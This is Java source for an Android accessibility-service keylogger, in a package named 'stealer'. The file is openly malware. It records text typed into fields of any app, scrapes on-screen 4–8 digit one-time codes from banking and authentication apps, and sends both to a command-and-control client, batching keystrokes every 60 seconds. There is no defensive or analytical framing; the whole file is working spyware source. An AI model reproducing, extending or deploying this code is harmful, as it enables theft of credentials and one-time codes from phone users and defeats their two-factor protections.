// lang: Java, file: AccessibilityKeylogger.java, target: Android 8+ API 26
// accessibility service — keylog via TYPE_VIEW_TEXT_CHANGED, scrape OTPs from any app

package com.example.zeca.stealer;

import android.accessibilityservice.*;
import android.content.Context;
import android.view.accessibility.*;
import java.util.*;

public class AccessibilityKeylogger extends AccessibilityService {

    // tracks last text per field so we can delta-log only new characters
    private final Map<String, String> fieldState = new HashMap<>();
    private final StringBuilder keyBuffer = new StringBuilder();
    private long lastFlush = 0;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        int type = event.getEventType();

        // keylogging — fires on every text change in any field
        if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            CharSequence before = event.getBeforeText();
            List<CharSequence> after = event.getText();
            if (after != null && !after.isEmpty()) {
                String key = event.getPackageName() + "/" +
                             (event.getViewIdResourceName() != null ?
                              event.getViewIdResourceName() : "field");
                String newText = after.get(0).toString();
                String lastText = fieldState.getOrDefault(key, "");

                // delta — only log what changed
                if (newText.length() > lastText.length()) {
                    String typed = newText.substring(lastText.length());
                    keyBuffer.append("[").append(event.getPackageName()).append("] ")
                             .append(typed).append("\n");
                }
                fieldState.put(key, newText);
            }
        }

        // scrape visible text — catches OTPs rendered on screen (banking, auth apps)
        if (type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
            type == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
            scrapeScreen(event.getSource());
        }

        // flush key buffer every 60 seconds
        long now = System.currentTimeMillis();
        if (keyBuffer.length() > 0 && (now - lastFlush) > 60_000) {
            C2Client.send(this, "KEYLOG", keyBuffer.toString());
            keyBuffer.setLength(0);
            lastFlush = now;
        }
    }

    private void scrapeScreen(AccessibilityNodeInfo node) {
        if (node == null) return;
        if (node.getText() != null) {
            String text = node.getText().toString();
            // simple OTP heuristic — 4-8 digit string, any app
            if (text.matches("\\d{4,8}")) {
                C2Client.send(this, "OTP_SCREEN",
                    node.getPackageName() + " → " + text);
            }
        }
        for (int i = 0; i < node.getChildCount(); i++)
            scrapeScreen(node.getChild(i));
    }

    @Override
    public void onInterrupt() {}
}